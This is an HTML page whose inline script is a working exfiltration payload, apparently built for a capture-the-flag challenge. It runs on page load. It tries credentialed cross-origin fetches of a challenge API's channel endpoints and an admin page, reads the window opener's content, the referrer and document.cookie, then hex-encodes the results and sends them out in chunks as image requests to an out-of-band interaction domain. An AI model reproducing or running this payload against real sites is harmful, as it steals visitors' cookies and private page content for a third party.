<!DOCTYPE html>
<html>
<head><title>x</title></head>
<body>
<script>
const oast = "da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun";

function exfil(label, data) {
    const hex = Array.from(new TextEncoder().encode(data)).map(b => b.toString(16).padStart(2,'0')).join('');
    // Split into 50-char chunks for DNS labels
    const chunks = hex.match(/.{1,50}/g) || ['empty'];
    chunks.forEach((chunk, i) => {
        new Image().src = `http://${label}-${i}-${chunk}.${oast}/x`;
    });
}

// Try to fetch the challenge API (cross-origin to http://web/)
// Use no-cors mode - request IS sent with cookies but response is opaque
async function tryChannels() {
    for (let ch = 11; ch <= 20; ch++) {
        try {
            // Try fetch with credentials
            const r = await fetch(`http://web/api/channels/${ch}/load`, {
                credentials: 'include',
                mode: 'cors'
            });
            const text = await r.text();
            exfil(`ch${ch}`, text);
        } catch(e) {
            // CORS blocked - try redirect approach
        }
    }
    
    // Try reading the opener's content if we were opened via window.open
    try {
        if (window.opener) {
            exfil('opener', window.opener.document.body.innerHTML);
        }
    } catch(e) {}
    
    // Try reading history
    exfil('info', `ref=${document.referrer}|hist=${history.length}|cookie=${document.cookie}`);
    
    // Try navigating to http://web/ and see if we can read it
    // This won't work cross-origin but let's try
    try {
        const r2 = await fetch('http://web/', { credentials: 'include', mode: 'cors' });
        const html = await r2.text();
        exfil('admin', html.substring(0, 200));
    } catch(e) {
        exfil('adminerr', e.message.substring(0, 100));
    }
}

tryChannels();
</script>
</body>
</html>
